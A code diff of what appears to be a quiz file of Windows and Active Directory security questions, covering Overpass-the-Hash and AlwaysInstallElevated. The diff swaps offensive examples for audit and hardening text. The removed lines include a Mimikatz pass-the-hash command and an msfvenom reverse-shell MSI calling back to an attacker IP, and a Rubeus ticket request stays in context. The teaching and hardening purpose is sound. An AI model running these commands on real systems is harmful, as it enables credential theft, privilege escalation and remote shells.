@@ -126,7 +126,7 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
   {
     question: "What is 'Overpass-the-Hash' (Pass-the-Key), and how does it convert an NTLM hash into a valid Kerberos Ticket-Granting Ticket (TGT)?",
     shortAnswer: "Using an NTLM hash to perform a Kerberos pre-authentication request (AS-REQ) to the Domain Controller, receiving a valid Kerberos TGT to move laterally using Kerberos rather than NTLM.",
-    explanation: "When organizations disable legacy NTLM authentication, standard Pass-the-Hash fails. In Overpass-the-Hash, the attacker uses tools like Rubeus or Mimikatz (`sekurlsa::pth /user:admin /domain:fintech.co.in /ntlm:[hash] /ptt`). The tool uses the NTLM hash as the encryption key for the Kerberos AS-REQ pre-authentication timestamp. The Domain Controller accepts the request and returns a valid Kerberos TGT into the user's memory session, allowing lateral movement over modern Kerberos.",
+    explanation: "When organizations disable legacy NTLM authentication, standard Pass-the-Hash fails. In Overpass-the-Hash, the attacker uses ticket-injection tools. The tool uses the NTLM hash as the encryption key for the Kerberos AS-REQ pre-authentication timestamp. The Domain Controller accepts the request and returns a valid Kerberos TGT into the user's memory session, allowing lateral movement over modern Kerberos.",
     hint: "Think of converting an old physical token into a modern digital barcode pass at the gate.",
     level: "expert",
     codeExample: `// Overpass-the-Hash via Rubeus:
@@ -136,14 +136,13 @@ Rubeus.exe asktgt /user:Administrator /domain:FINTECH.CO.IN /rc4:8846f7eaee8fb11
   {
     question: "What is 'AlwaysInstallElevated' in the Windows Registry, and how does it allow standard users to execute arbitrary `.msi` installers with SYSTEM privileges?",
     shortAnswer: "A registry policy setting that, if enabled under both HKCU and HKLM, forces Windows Installer (`msiexec`) to run all `.msi` installation packages with elevated `NT AUTHORITY\\SYSTEM` rights.",
-    explanation: "If administrators enable `AlwaysInstallElevated = 1` in both `HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer` and `HKCU\\Software\\Policies\\...`, any user can execute an installation package with full SYSTEM privileges. An ethical hacker generates a malicious installer using `msfvenom -p windows/shell_reverse_tcp LHOST=... -f msi -o update.msi` and runs `msiexec /quiet /qn /i update.msi`, instantly receiving a SYSTEM reverse shell.",
-    hint: "Think of an administrative rule that says any installation package must be trusted as if the CEO approved it.",
+    explanation: "If administrators enable `AlwaysInstallElevated = 1` in both `HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer` and `HKCU\\Software\\Policies\\...`, any user can execute an installation package with full SYSTEM privileges. Security auditors inspect this registry configuration to ensure the insecure elevated execution setting is disabled across all enterprise endpoints.",
+    hint: "An administrative misconfiguration that causes standard MSI installer packages to run with elevated privileges.",
     level: "moderate",
-    codeExample: `// AlwaysInstallElevated Exploitation:
-reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated # Value: 0x1
-reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated # Value: 0x1
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f msi -o shell.msi
-msiexec /quiet /qn /i shell.msi`
+    codeExample: `// AlwaysInstallElevated Policy Audit & Hardening:
+reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated # Must be 0x0
+reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated # Must be 0x0
+# Remediation: Ensure AlwaysInstallElevated is disabled (0x0) via Group Policy Objects (GPO).`
   },
   {
     question: "What is the 'Tiered Administration Model' (Tier 0, Tier 1, Tier 2), and how does it stop lateral movement across enterprise Active Directory networks?",
